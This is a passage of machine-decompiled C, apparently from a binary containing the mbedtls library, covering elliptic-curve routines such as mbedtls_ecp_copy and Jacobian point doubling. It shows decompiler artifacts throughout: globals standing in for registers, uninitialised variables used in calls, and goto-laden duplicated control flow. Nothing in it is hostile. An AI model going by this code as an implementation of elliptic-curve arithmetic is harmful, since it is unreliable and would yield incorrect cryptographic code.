                                    result3 = v17;
                                }
                            }
                            // 0x805c2d1
                            g6 = v14;
                            g1 = mbedtls_mpi_free(&v13);
                            mbedtls_mpi_free((int32_t *)g5);
                            // branch -> 0x805c22d
                            // 0x805c22d
                            g3 = v2;
                            g7 = v1;
                            g5 = v3;
                            return result3;
                        }
                    }
                }
            }
        }
        // 0x805c228
        result5 = -0x4c80;
        // branch -> 0x805c22d
    } else {
        result5 = -0x4f80;
    }
    // 0x805c22d
    g3 = v2;
    g7 = v1;
    g5 = v3;
    return result5;
}

// Address range: 0x805c470 - 0x805c4cf
int32_t mbedtls_ecp_copy(int32_t a1, int32_t a2) {
    int32_t v1 = g3; // 0x805c476
    g3 = a1;
    int32_t v2 = g7; // 0x805c47c
    g7 = a2;
    int32_t v3 = mbedtls_mpi_copy((char *)a1, (int32_t *)a2); // 0x805c489
    int32_t result = v3; // 0x805c49b_2
    if (v3 == 0) {
        int32_t v4 = g3 + 12; // 0x805c4a7
        g1 = v4;
        int32_t v5 = mbedtls_mpi_copy((char *)v4, (int32_t *)(g7 + 12)); // 0x805c4ad
        g1 = v5;
        if (v5 == 0) {
            // 0x805c4b6
            g7 = v2;
            g3 = v1;
            int32_t v6;
            int32_t v7;
            return mbedtls_mpi_copy((char *)v7, (int32_t *)v6);
        }
        result = v5;
    }
    // 0x805c492
    g3 = v1;
    g7 = v2;
    return result;
}

// Address range: 0x805c4d0 - 0x805cc4f
int32_t ecp_double_jac(int32_t a1, int32_t a2) {
    int32_t v1 = g7; // 0x805c4d4
    int32_t v2 = g3; // 0x805c4d5
    int32_t v3;
    g7 = &v3;
    int32_t v4;
    int32_t v5 = &v4; // 0x805c4dc_0
    g3 = v5;
    int32_t v6;
    int32_t v7 = &v6; // 0x805c4df_0
    g5 = v7;
    int32_t v8 = g6; // 0x805c4e2
    int32_t v9 = g1; // 0x805c4e5
    int32_t v10 = g4; // 0x805c4e8
    g215++;
    mbedtls_mpi_init(&v3);
    mbedtls_mpi_init((int32_t *)g3);
    mbedtls_mpi_init((int32_t *)g5);
    int32_t v11;
    int32_t result = &v11; // 0x805c50a_0
    mbedtls_mpi_init(&v11);
    int32_t v12; // 0x805c5fd
    int32_t v13; // 0x805cc21
    int32_t v14; // 0x805cc3e
    int32_t v15; // 0x805c60b
    int32_t v16; // 0x805c61d
    int32_t v17; // 0x805c63c
    int32_t v18; // 0x805c686
    int32_t v19; // 0x805c698
    int32_t v20; // 0x805c6b7
    int32_t v21; // 0x805c701
    int32_t v22; // 0x805c714
    int32_t v23; // 0x805c736
    int32_t v24; // 0x805c858
    int32_t v25; // 0x805c9e3
    int32_t v26; // 0x805c9f5
    int32_t v27; // 0x805ca14
    int32_t v28; // 0x805ca62
    int32_t v29; // 0x805cab0
    int32_t v30; // 0x805cafe
    int32_t v31; // 0x805cb10
    int32_t v32; // 0x805cb32
    int32_t v33; // 0x805cb8c
    int32_t v34; // 0x805cb9f
    int32_t v35; // 0x805cbc1
    int32_t v36; // 0x805cbdb
    int32_t v37; // 0x805cc0d
    int32_t v38; // 0x805cc27
    int32_t v39; // 0x805cc44
    int32_t * v40;
    int32_t * v41;
    int32_t * v42;
    int32_t * v43;
    int32_t * v44;
    int32_t * v45;
    int32_t * v46;
    int32_t * v47;
    int32_t * v48;
    int32_t v49; // 0x805c5fa
    int32_t v50; // 0x805c67f
    int32_t v51; // 0x805c9e0
    int32_t v52; // 0x805c6f6
    int32_t v53; // 0x805c9d8
    int32_t v54; // 0x805caf7
    int32_t v55; // 0x805cbe496
    if (*(int32_t *)(v9 + 24) == 0) {
        int32_t v56 = g3; // 0x805c783
        int32_t v57 = v10 + 24; // 0x805c786
        int32_t * v58 = (int32_t *)v57;
        int32_t v59 = mbedtls_mpi_mul_mpi((int32_t *)v56, v58, v58); // 0x805c791
        g1 = v59;
        if (v59 == 0) {
            // 0x805c79e
            g6 = v9;
            g1 = v5;
            int32_t v60 = ecp_modp(v56, v57); // 0x805c7a3
            g1 = v60;
            if (v60 == 0) {
                // 0x805c7b0
                g216++;
                int32_t * v61 = (int32_t *)v10;
                int32_t v62 = mbedtls_mpi_add_mpi((int32_t *)g5, v61, (int32_t *)g3); // 0x805c7c5
                g1 = v62;
                if (v62 == 0) {
                    int32_t v63 = v9 + 4; // 0x805c7d5
                    int32_t * v64 = (int32_t *)v63;
                    // branch -> 0x805c7fb
                    int32_t v65; // 0x805c7ee
                    while (true) {
                        // 0x805c7fb
                        if (mbedtls_mpi_cmp_mpi((int32_t *)g5, v64) < 0) {
                            int32_t v66 = mbedtls_mpi_sub_mpi(&v11, v61, (int32_t *)g3); // 0x805c81f
                            g1 = v66;
                            if (v66 == 0) {
                                while (true) {
                                    // 0x805c865
                                    if (v11 < 0) {
                                        // 0x805c830
                                        if (mbedtls_mpi_cmp_int(result, 0) != 0) {
                                            // 0x805c847
                                            v24 = mbedtls_mpi_add_mpi(&v11, &v11, v64);
                                            g1 = v24;
                                            if (v24 != 0) {
                                                // break -> 0x805c53a
                                                break;
                                            }
                                            // continue -> 0x805c865
                                            continue;
                                        }
                                    }
                                    int32_t v67 = g5; // 0x805c873
                                    int32_t v68 = g3; // 0x805c877
                                    int32_t v69 = mbedtls_mpi_mul_mpi((int32_t *)v68, (int32_t *)v67, &v11); // 0x805c87a
                                    g1 = v69;
                                    if (v69 == 0) {
                                        // 0x805c887
                                        g6 = v9;
                                        g1 = v5;
                                        int32_t v70 = ecp_modp(v68, v67); // 0x805c88c
                                        g1 = v70;
                                        if (v70 == 0) {
                                            // 0x805c899
                                            g216++;
                                            int32_t v71 = mbedtls_mpi_mul_int(g7, g3, 3); // 0x805c8af
                                            g1 = v71;
                                            if (v71 == 0) {
                                                while (true) {
                                                    // 0x805c8d8
                                                    if (mbedtls_mpi_cmp_mpi((int32_t *)g7, v64) > 0) {
                                                        int32_t v72 = g7; // 0x805c8c0
                                                        int32_t v73 = mbedtls_mpi_sub_abs((int32_t *)v72, v72, v63); // 0x805c8cb
                                                        g1 = v73;
                                                        if (v73 != 0) {
                                                            v24 = v73;
                                                            // break -> 0x805c53a
                                                            break;
                                                        }
                                                        // continue -> 0x805c8d8
                                                        continue;
                                                    } else {
                                                        v55 = v63;
                                                        // 0x805c5f7
                                                        v49 = g5;
                                                        v12 = v10 + 12;
                                                        v40 = (int32_t *)v12;
                                                        v15 = mbedtls_mpi_mul_mpi((int32_t *)v49, v40, v40);
                                                        g1 = v15;
                                                        if (v15 == 0) {
                                                            // 0x805c618
                                                            g6 = v9;
                                                            g1 = v7;
                                                            v16 = ecp_modp(v49, v12);
                                                            g1 = v16;
                                                            if (v16 == 0) {
                                                                // 0x805c62a
                                                                g216++;
                                                                v17 = mbedtls_mpi_shift_l(g5, 1);
                                                                g1 = v17;
                                                                if (v17 == 0) {
                                                                    // 0x805c665
                                                                    v41 = (int32_t *)v55;
                                                                    // branch -> 0x805c665
                                                                    int32_t v74; // 0x805c658
                                                                    while (true) {
                                                                        // 0x805c665
                                                                        if (mbedtls_mpi_cmp_mpi((int32_t *)g5, v41) < 0) {
                                                                            // 0x805c678
                                                                            v50 = g3;
                                                                            v18 = mbedtls_mpi_mul_mpi((int32_t *)v50, (int32_t *)v10, (int32_t *)g5);
                                                                            g1 = v18;
                                                                            if (v18 == 0) {
                                                                                // 0x805c693
                                                                                g6 = v9;
                                                                                g1 = v5;
                                                                                v19 = ecp_modp(v50, v10);
                                                                                g1 = v19;
                                                                                if (v19 == 0) {
                                                                                    // 0x805c6a5
                                                                                    g216++;
                                                                                    v20 = mbedtls_mpi_shift_l(g3, 1);
                                                                                    g1 = v20;
                                                                                    if (v20 == 0) {
                                                                                        while (true) {
                                                                                            // 0x805c6e0
                                                                                            if (mbedtls_mpi_cmp_mpi((int32_t *)g3, v41) > 0) {
                                                                                              lab_0x805c6c5_2:;
                                                                                                int32_t v75 = g3; // 0x805c6c8
                                                                                                int32_t v76 = mbedtls_mpi_sub_abs((int32_t *)v75, v75, v55); // 0x805c6d3
                                                                                                g1 = v76;
                                                                                                if (v76 != 0) {
                                                                                                    v24 = v76;
                                                                                                    // break -> 0x805c53a
                                                                                                    break;
                                                                                                }
                                                                                                // continue -> 0x805c6e0
                                                                                                continue;
                                                                                            } else {
                                                                                                // 0x805c6f3
                                                                                                v52 = g5;
                                                                                                v42 = (int32_t *)v52;
                                                                                                v21 = mbedtls_mpi_mul_mpi(&v11, v42, v42);
                                                                                                g1 = v21;
                                                                                                if (v21 == 0) {
                                                                                                    // 0x805c70e
                                                                                                    g6 = v9;
                                                                                                    g1 = result;
                                                                                                    v22 = ecp_modp(result, v52);
                                                                                                    g1 = v22;
                                                                                                    if (v22 == 0) {
                                                                                                        // 0x805c721
                                                                                                        g216++;
                                                                                                        v23 = mbedtls_mpi_shift_l(result, 1);
                                                                                                        g1 = v23;
                                                                                                        if (v23 == 0) {
                                                                                                            int32_t v77; // 0x805c76e
                                                                                                            while (true) {
                                                                                                                // 0x805c743
                                                                                                                if (mbedtls_mpi_cmp_mpi(&v11, v41) < 0) {
                                                                                                                    // 0x805c9d8
                                                                                                                    v53 = g7;
                                                                                                                    v51 = g5;
                                                                                                                    v43 = (int32_t *)v53;
                                                                                                                    v25 = mbedtls_mpi_mul_mpi((int32_t *)v51, v43, v43);
                                                                                                                    g1 = v25;
                                                                                                                    if (v25 == 0) {
                                                                                                                        // 0x805c9f0
                                                                                                                        g6 = v9;
                                                                                                                        g1 = v7;
                                                                                                                        v26 = ecp_modp(v51, v53);
                                                                                                                        g1 = v26;
                                                                                                                        if (v26 == 0) {
                                                                                                                            // 0x805ca02
                                                                                                                            g216++;
                                                                                                                            v44 = (int32_t *)g5;
                                                                                                                            v27 = mbedtls_mpi_sub_mpi(v44, v44, (int32_t *)g3);
                                                                                                                            g1 = v27;
                                                                                                                            if (v27 == 0) {
                                                                                                                                while (true) {
                                                                                                                                    // 0x805ca21
                                                                                                                                    if (v6 <= 0) {
                                                                                                                                      lab_0x805ca27_2:
                                                                                                                                        // 0x805ca27
                                                                                                                                        if (mbedtls_mpi_cmp_int(g5, 0) != 0) {
                                                                                                                                            int32_t * v78 = (int32_t *)g5;
                                                                                                                                            int32_t v79 = mbedtls_mpi_add_mpi(v78, v78, v41); // 0x805ca49
                                                                                                                                            g1 = v79;
                                                                                                                                            if (v79 != 0) {
                                                                                                                                                v24 = v79;
                                                                                                                                                // break -> 0x805c53a
                                                                                                                                                break;
                                                                                                                                            }
                                                                                                                                            // continue -> 0x805ca21
                                                                                                                                            continue;
                                                                                                                                        }
                                                                                                                                    }
                                                                                                                                    // 0x805ca57
                                                                                                                                    v45 = (int32_t *)g5;
                                                                                                                                    v28 = mbedtls_mpi_sub_mpi(v45, v45, (int32_t *)g3);
                                                                                                                                    g1 = v28;
                                                                                                                                    if (v28 == 0) {
                                                                                                                                        while (true) {
                                                                                                                                            // 0x805ca6f
                                                                                                                                            if (v6 <= 0) {
                                                                                                                                              lab_0x805ca75_2:
                                                                                                                                                // 0x805ca75
                                                                                                                                                if (mbedtls_mpi_cmp_int(g5, 0) != 0) {
                                                                                                                                                    int32_t * v80 = (int32_t *)g5;
                                                                                                                                                    int32_t v81 = mbedtls_mpi_add_mpi(v80, v80, v41); // 0x805ca97
                                                                                                                                                    g1 = v81;
                                                                                                                                                    if (v81 != 0) {
                                                                                                                                                        v24 = v81;
                                                                                                                                                        // break -> 0x805c53a
                                                                                                                                                        break;
                                                                                                                                                    }
                                                                                                                                                    // continue -> 0x805ca6f
                                                                                                                                                    continue;
                                                                                                                                                }
                                                                                                                                            }
                                                                                                                                            // 0x805caa5
                                                                                                                                            v46 = (int32_t *)g3;
                                                                                                                                            v29 = mbedtls_mpi_sub_mpi(v46, v46, (int32_t *)g5);
                                                                                                                                            g1 = v29;
                                                                                                                                            if (v29 == 0) {
                                                                                                                                                while (true) {
                                                                                                                                                    // 0x805cabd
                                                                                                                                                    if (v4 <= 0) {
                                                                                                                                                      lab_0x805cac3_2:
                                                                                                                                                        // 0x805cac3
                                                                                                                                                        if (mbedtls_mpi_cmp_int(g3, 0) != 0) {
                                                                                                                                                            int32_t * v82 = (int32_t *)g3;
                                                                                                                                                            int32_t v83 = mbedtls_mpi_add_mpi(v82, v82, v41); // 0x805cae5
                                                                                                                                                            g1 = v83;
                                                                                                                                                            if (v83 != 0) {
                                                                                                                                                                v24 = v83;
                                                                                                                                                                // break -> 0x805c53a
                                                                                                                                                                break;
                                                                                                                                                            }
                                                                                                                                                            // continue -> 0x805cabd
                                                                                                                                                            continue;
                                                                                                                                                        }
                                                                                                                                                    }
                                                                                                                                                    // 0x805caf3
                                                                                                                                                    v54 = g3;
                                                                                                                                                    v47 = (int32_t *)v54;
                                                                                                                                                    v30 = mbedtls_mpi_mul_mpi(v47, v47, (int32_t *)g7);
                                                                                                                                                    g1 = v30;
                                                                                                                                                    if (v30 == 0) {
                                                                                                                                                        // 0x805cb0b
                                                                                                                                                        g6 = v9;
                                                                                                                                                        g1 = v5;
                                                                                                                                                        v31 = ecp_modp(v54, v54);
                                                                                                                                                        g1 = v31;
                                                                                                                                                        if (v31 == 0) {
                                                                                                                                                            // 0x805cb1d
                                                                                                                                                            g216++;
                                                                                                                                                            v48 = (int32_t *)g3;
                                                                                                                                                            v32 = mbedtls_mpi_sub_mpi(v48, v48, &v11);
                                                                                                                                                            g1 = v32;
                                                                                                                                                            if (v32 == 0) {
                                                                                                                                                                while (true) {
                                                                                                                                                                    // 0x805cb3f
                                                                                                                                                                    if (v4 <= 0) {
                                                                                                                                                                      lab_0x805cb45_2:
                                                                                                                                                                        // 0x805cb45
                                                                                                                                                                        if (mbedtls_mpi_cmp_int(g3, 0) != 0) {
                                                                                                                                                                            int32_t * v84 = (int32_t *)g3;
                                                                                                                                                                            int32_t v85 = mbedtls_mpi_add_mpi(v84, v84, v41); // 0x805cb67
                                                                                                                                                                            g1 = v85;
                                                                                                                                                                            if (v85 != 0) {
                                                                                                                                                                                v24 = v85;
                                                                                                                                                                                // break -> 0x805c53a
                                                                                                                                                                                break;
                                                                                                                                                                            }
                                                                                                                                                                            // continue -> 0x805cb3f
                                                                                                                                                                            continue;
                                                                                                                                                                        }
                                                                                                                                                                    }
                                                                                                                                                                    // 0x805cb75
                                                                                                                                                                    v33 = mbedtls_mpi_mul_mpi(&v11, v40, (int32_t *)(v10 + 24));
                                                                                                                                                                    g1 = v33;
                                                                                                                                                                    if (v33 == 0) {
                                                                                                                                                                        // 0x805cb99
                                                                                                                                                                        g6 = v9;
                                                                                                                                                                        g1 = result;
                                                                                                                                                                        v34 = ecp_modp(result, v12);
                                                                                                                                                                        g1 = v34;
                                                                                                                                                                        if (v34 == 0) {
                                                                                                                                                                            // 0x805cbac
                                                                                                                                                                            g216++;
                                                                                                                                                                            v35 = mbedtls_mpi_shift_l(result, 1);
                                                                                                                                                                            g1 = v35;
                                                                                                                                                                            if (v35 == 0) {
                                                                                                                                                                                int32_t v86; // 0x805cbf5
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    // 0x805cbce
                                                                                                                                                                                    v36 = mbedtls_mpi_cmp_mpi(&v11, v41);
                                                                                                                                                                                    g1 = v36;
                                                                                                                                                                                    if (v36 < 0) {
                                                                                                                                                                                        // 0x805cc03
                                                                                                                                                                                        v37 = mbedtls_mpi_copy((char *)v8, (int32_t *)g5);
                                                                                                                                                                                        g1 = v37;
                                                                                                                                                                                        if (v37 == 0) {
                                                                                                                                                                                            // 0x805cc1a
                                                                                                                                                                                            v13 = v8 + 12;
                                                                                                                                                                                            g1 = v13;
                                                                                                                                                                                            v38 = mbedtls_mpi_copy((char *)v13, (int32_t *)g3);
                                                                                                                                                                                            g1 = v38;
                                                                                                                                                                                            if (v38 == 0) {
                                                                                                                                                                                                // 0x805cc34
                                                                                                                                                                                                v14 = v8 + 24;
                                                                                                                                                                                                g1 = v14;
                                                                                                                                                                                                v39 = mbedtls_mpi_copy((char *)v14, &v11);
                                                                                                                                                                                                g1 = v39;
                                                                                                                                                                                                // branch -> 0x805c53a
                                                                                                                                                                                                // 0x805c53a
                                                                                                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                                                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                                                                                                                                                mbedtls_mpi_free(&v11);
                                                                                                                                                                                                g1 = v39;
                                                                                                                                                                                                g3 = v2;
                                                                                                                                                                                                g7 = v1;
                                                                                                                                                                                                return result;
                                                                                                                                                                                            }
                                                                                                                                                                                            v24 = v38;
                                                                                                                                                                                        } else {
                                                                                                                                                                                            v24 = v37;
                                                                                                                                                                                        }
                                                                                                                                                                                    } else {
                                                                                                                                                                                      lab_0x805cbe4_2:
                                                                                                                                                                                        // 0x805cbe4
                                                                                                                                                                                        v86 = mbedtls_mpi_sub_abs(&v11, result, v55);
                                                                                                                                                                                        g1 = v86;
                                                                                                                                                                                        if (v86 != 0) {
                                                                                                                                                                                            // break -> 0x805c53a
                                                                                                                                                                                            break;
                                                                                                                                                                                        }
                                                                                                                                                                                        // continue -> 0x805cbce
                                                                                                                                                                                        continue;
                                                                                                                                                                                    }
                                                                                                                                                                                    // 0x805c53a
                                                                                                                                                                                    g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                                                                                                                                    g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                                                                                    g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                                                                                                                                    mbedtls_mpi_free(&v11);
                                                                                                                                                                                    g1 = v24;
                                                                                                                                                                                    g3 = v2;
                                                                                                                                                                                    g7 = v1;
                                                                                                                                                                                    return result;
                                                                                                                                                                                }
                                                                                                                                                                                // 0x805c53a
                                                                                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                                                                                                                                mbedtls_mpi_free(&v11);
                                                                                                                                                                                g1 = v86;
                                                                                                                                                                                g3 = v2;
                                                                                                                                                                                g7 = v1;
                                                                                                                                                                                return result;
                                                                                                                                                                            }
                                                                                                                                                                            v24 = v35;
                                                                                                                                                                        } else {
                                                                                                                                                                            v24 = v34;
                                                                                                                                                                        }
                                                                                                                                                                    } else {
                                                                                                                                                                        v24 = v33;
                                                                                                                                                                    }
                                                                                                                                                                }
                                                                                                                                                            } else {
                                                                                                                                                                v24 = v32;
                                                                                                                                                            }
                                                                                                                                                        } else {
                                                                                                                                                            v24 = v31;
                                                                                                                                                        }
                                                                                                                                                    } else {
                                                                                                                                                        v24 = v30;
                                                                                                                                                    }
                                                                                                                                                }
                                                                                                                                            } else {
                                                                                                                                                v24 = v29;
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                    } else {
                                                                                                                                        v24 = v28;
                                                                                                                                    }
                                                                                                                                }
                                                                                                                            } else {
                                                                                                                                v24 = v27;
                                                                                                                            }
                                                                                                                        } else {
                                                                                                                            v24 = v26;
                                                                                                                        }
                                                                                                                    } else {
                                                                                                                        v24 = v25;
                                                                                                                    }
                                                                                                                } else {
                                                                                                                  lab_0x805c75d_2:
                                                                                                                    // 0x805c75d
                                                                                                                    v77 = mbedtls_mpi_sub_abs(&v11, result, v55);
                                                                                                                    g1 = v77;
                                                                                                                    if (v77 != 0) {
                                                                                                                        // break -> 0x805c53a
                                                                                                                        break;
                                                                                                                    }
                                                                                                                    // continue -> 0x805c743
                                                                                                                    continue;
                                                                                                                }
                                                                                                                // 0x805c53a
                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                                                                mbedtls_mpi_free(&v11);
                                                                                                                g1 = v24;
                                                                                                                g3 = v2;
                                                                                                                g7 = v1;
                                                                                                                return result;
                                                                                                            }
                                                                                                            // 0x805c53a
                                                                                                            g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                            g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                                                            mbedtls_mpi_free(&v11);
                                                                                                            g1 = v77;
                                                                                                            g3 = v2;
                                                                                                            g7 = v1;
                                                                                                            return result;
                                                                                                        }
                                                                                                        v24 = v23;
                                                                                                    } else {
                                                                                                        v24 = v22;
                                                                                                    }
                                                                                                } else {
                                                                                                    v24 = v21;
                                                                                                }
                                                                                            }
                                                                                            // 0x805c53a
                                                                                            g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                            g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                                            mbedtls_mpi_free(&v11);
                                                                                            g1 = v24;
                                                                                            g3 = v2;
                                                                                            g7 = v1;
                                                                                            return result;
                                                                                        }
                                                                                    } else {
                                                                                        v24 = v20;
                                                                                    }
                                                                                } else {
                                                                                    v24 = v19;
                                                                                }
                                                                            } else {
                                                                                v24 = v18;
                                                                            }
                                                                        } else {
                                                                          lab_0x805c64a_2:;
                                                                            int32_t v87 = g5; // 0x805c64d
                                                                            v74 = mbedtls_mpi_sub_abs((int32_t *)v87, v87, v55);
                                                                            g1 = v74;
                                                                            if (v74 != 0) {
                                                                                // break -> 0x805c53a
                                                                                break;
                                                                            }
                                                                            // continue -> 0x805c665
                                                                            continue;
                                                                        }
                                                                        // 0x805c53a
                                                                        g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                        g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                        g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                        mbedtls_mpi_free(&v11);
                                                                        g1 = v24;
                                                                        g3 = v2;
                                                                        g7 = v1;
                                                                        return result;
                                                                    }
                                                                    // 0x805c53a
                                                                    g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                    g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                    g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                    mbedtls_mpi_free(&v11);
                                                                    g1 = v74;
                                                                    g3 = v2;
                                                                    g7 = v1;
                                                                    return result;
                                                                }
                                                                v24 = v17;
                                                            } else {
                                                                v24 = v16;
                                                            }
                                                        } else {
                                                            v24 = v15;
                                                        }
                                                    }
                                                    // 0x805c53a
                                                    g1 = mbedtls_mpi_free((int32_t *)g7);
                                                    g1 = mbedtls_mpi_free((int32_t *)g3);
                                                    g1 = mbedtls_mpi_free((int32_t *)g5);
                                                    mbedtls_mpi_free(&v11);
                                                    g1 = v24;
                                                    g3 = v2;
                                                    g7 = v1;
                                                    return result;
                                                }
                                            } else {
                                                v24 = v71;
                                            }
                                        } else {
                                            v24 = v70;
                                        }
                                    } else {
                                        v24 = v69;
                                    }
                                }
                            } else {
                                v24 = v66;
                            }
                        } else {
                            int32_t v88 = g5; // 0x805c7e3
                            v65 = mbedtls_mpi_sub_abs((int32_t *)v88, v88, v63);
                            g1 = v65;
                            if (v65 != 0) {
                                // break -> 0x805c53a
                                break;
                            }
                            // continue -> 0x805c7fb
                            continue;
                        }
                        // 0x805c53a
                        g1 = mbedtls_mpi_free((int32_t *)g7);
                        g1 = mbedtls_mpi_free((int32_t *)g3);
                        g1 = mbedtls_mpi_free((int32_t *)g5);
                        mbedtls_mpi_free(&v11);
                        g1 = v24;
                        g3 = v2;
                        g7 = v1;
                        return result;
                    }
                    // 0x805c53a
                    g1 = mbedtls_mpi_free((int32_t *)g7);
                    g1 = mbedtls_mpi_free((int32_t *)g3);
                    g1 = mbedtls_mpi_free((int32_t *)g5);
                    mbedtls_mpi_free(&v11);
                    g1 = v65;
                    g3 = v2;
                    g7 = v1;
                    return result;
                }
                v24 = v62;
            } else {
                v24 = v60;
            }
        } else {
            v24 = v59;
        }
    } else {
        int32_t v89 = g3; // 0x805c526
        int32_t * v90 = (int32_t *)v10;
        int32_t v91 = mbedtls_mpi_mul_mpi((int32_t *)v89, v90, v90); // 0x805c531
        g1 = v91;
        if (v91 == 0) {
            // 0x805c570
            g6 = v9;
            g1 = v5;
            int32_t v92 = ecp_modp(v89, v10); // 0x805c575
            g1 = v92;
            if (v92 == 0) {
                // 0x805c57e
                g216++;
                int32_t v93 = mbedtls_mpi_mul_int(g7, g3, 3); // 0x805c594
                g1 = v93;
                if (v93 == 0) {
                    int32_t v94 = v9 + 4; // 0x805c5a0
                    int32_t * v95 = (int32_t *)v94;
                    // branch -> 0x805c5c3
                    while (true) {
                        // 0x805c5c3
                        if (mbedtls_mpi_cmp_mpi((int32_t *)g7, v95) <= 0) {
                            int32_t v96 = v9 + 16; // 0x805c5e1
                            if (mbedtls_mpi_cmp_int(v96, 0) == 0) {
                                v55 = v94;
                                // 0x805c5f7
                                v49 = g5;
                                v12 = v10 + 12;
                                v40 = (int32_t *)v12;
                                v15 = mbedtls_mpi_mul_mpi((int32_t *)v49, v40, v40);
                                g1 = v15;
                                if (v15 == 0) {
                                    // 0x805c618
                                    g6 = v9;
                                    g1 = v7;
                                    v16 = ecp_modp(v49, v12);
                                    g1 = v16;
                                    if (v16 == 0) {
                                        // 0x805c62a
                                        g216++;
                                        v17 = mbedtls_mpi_shift_l(g5, 1);
                                        g1 = v17;
                                        if (v17 == 0) {
                                            // 0x805c665
                                            v41 = (int32_t *)v55;
                                            // branch -> 0x805c665
                                            while (true) {
                                                // 0x805c665
                                                if (mbedtls_mpi_cmp_mpi((int32_t *)g5, v41) >= 0) {
                                                    goto lab_0x805c64a_2;
                                                }
                                                // 0x805c678
                                                v50 = g3;
                                                v18 = mbedtls_mpi_mul_mpi((int32_t *)v50, (int32_t *)v10, (int32_t *)g5);
                                                g1 = v18;
                                                if (v18 == 0) {
                                                    // 0x805c693
                                                    g6 = v9;
                                                    g1 = v5;
                                                    v19 = ecp_modp(v50, v10);
                                                    g1 = v19;
                                                    if (v19 == 0) {
                                                        // 0x805c6a5
                                                        g216++;
                                                        v20 = mbedtls_mpi_shift_l(g3, 1);
                                                        g1 = v20;
                                                        if (v20 == 0) {
                                                            while (true) {
                                                                // 0x805c6e0
                                                                if (mbedtls_mpi_cmp_mpi((int32_t *)g3, v41) > 0) {
                                                                    goto lab_0x805c6c5_2;
                                                                }
                                                                // 0x805c6f3
                                                                v52 = g5;
                                                                v42 = (int32_t *)v52;
                                                                v21 = mbedtls_mpi_mul_mpi(&v11, v42, v42);
                                                                g1 = v21;
                                                                if (v21 == 0) {
                                                                    // 0x805c70e
                                                                    g6 = v9;
                                                                    g1 = result;
                                                                    v22 = ecp_modp(result, v52);
                                                                    g1 = v22;
                                                                    if (v22 == 0) {
                                                                        // 0x805c721
                                                                        g216++;
                                                                        v23 = mbedtls_mpi_shift_l(result, 1);
                                                                        g1 = v23;
                                                                        if (v23 == 0) {
                                                                            while (true) {
                                                                                // 0x805c743
                                                                                if (mbedtls_mpi_cmp_mpi(&v11, v41) >= 0) {
                                                                                    goto lab_0x805c75d_2;
                                                                                }
                                                                                // 0x805c9d8
                                                                                v53 = g7;
                                                                                v51 = g5;
                                                                                v43 = (int32_t *)v53;
                                                                                v25 = mbedtls_mpi_mul_mpi((int32_t *)v51, v43, v43);
                                                                                g1 = v25;
                                                                                if (v25 == 0) {
                                                                                    // 0x805c9f0
                                                                                    g6 = v9;
                                                                                    g1 = v7;
                                                                                    v26 = ecp_modp(v51, v53);
                                                                                    g1 = v26;
                                                                                    if (v26 == 0) {
                                                                                        // 0x805ca02
                                                                                        g216++;
                                                                                        v44 = (int32_t *)g5;
                                                                                        v27 = mbedtls_mpi_sub_mpi(v44, v44, (int32_t *)g3);
                                                                                        g1 = v27;
                                                                                        if (v27 == 0) {
                                                                                            while (true) {
                                                                                                // 0x805ca21
                                                                                                if (v6 <= 0) {
                                                                                                    goto lab_0x805ca27_2;
                                                                                                }
                                                                                                // 0x805ca57
                                                                                                v45 = (int32_t *)g5;
                                                                                                v28 = mbedtls_mpi_sub_mpi(v45, v45, (int32_t *)g3);
                                                                                                g1 = v28;
                                                                                                if (v28 == 0) {
                                                                                                    while (true) {
                                                                                                        // 0x805ca6f
                                                                                                        if (v6 <= 0) {
                                                                                                            goto lab_0x805ca75_2;
                                                                                                        }
                                                                                                        // 0x805caa5
                                                                                                        v46 = (int32_t *)g3;
                                                                                                        v29 = mbedtls_mpi_sub_mpi(v46, v46, (int32_t *)g5);
                                                                                                        g1 = v29;
                                                                                                        if (v29 == 0) {
                                                                                                            while (true) {
                                                                                                                // 0x805cabd
                                                                                                                if (v4 <= 0) {
                                                                                                                    goto lab_0x805cac3_2;
                                                                                                                }
                                                                                                                // 0x805caf3
                                                                                                                v54 = g3;
                                                                                                                v47 = (int32_t *)v54;
                                                                                                                v30 = mbedtls_mpi_mul_mpi(v47, v47, (int32_t *)g7);
                                                                                                                g1 = v30;
                                                                                                                if (v30 == 0) {
                                                                                                                    // 0x805cb0b
                                                                                                                    g6 = v9;
                                                                                                                    g1 = v5;
                                                                                                                    v31 = ecp_modp(v54, v54);
                                                                                                                    g1 = v31;
                                                                                                                    if (v31 == 0) {
                                                                                                                        // 0x805cb1d
                                                                                                                        g216++;
                                                                                                                        v48 = (int32_t *)g3;
                                                                                                                        v32 = mbedtls_mpi_sub_mpi(v48, v48, &v11);
                                                                                                                        g1 = v32;
                                                                                                                        if (v32 == 0) {
                                                                                                                            while (true) {
                                                                                                                                // 0x805cb3f
                                                                                                                                if (v4 <= 0) {
                                                                                                                                    goto lab_0x805cb45_2;
                                                                                                                                }
                                                                                                                                // 0x805cb75
                                                                                                                                v33 = mbedtls_mpi_mul_mpi(&v11, v40, (int32_t *)(v10 + 24));
                                                                                                                                g1 = v33;
                                                                                                                                if (v33 == 0) {
                                                                                                                                    // 0x805cb99
